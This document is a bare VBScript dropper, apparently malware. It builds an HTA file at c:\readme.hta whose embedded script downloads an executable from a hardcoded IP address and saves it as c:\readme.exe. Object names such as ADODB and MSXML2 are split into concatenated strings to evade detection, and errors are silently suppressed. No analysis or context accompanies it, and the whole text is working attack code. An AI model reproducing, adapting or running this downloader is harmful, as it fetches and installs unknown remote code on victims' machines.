On Error Resume Next
set c = CreateObject("AD"+"OD"+"B.Rec"+"or"+"ds"+"et")
   With c
       .Fields.Append "c", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("c").Value = "<script language=""vbscript"">: on error resume next : set o = CreateObject(""msx""+""ml2.X""+""ML""+""HT""+""TP"") : o.open ""GET"",""http://205.177.122.27/docs/404/l4.exe"",False : o.send : set s = createobject(""ad""+""od""+""b.s""+""tr""+""eam"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""c:\readme.exe"",2</script>"
       Call .Update
   End With
c.Save "c:\readme.hta", adPersistXML
c.Close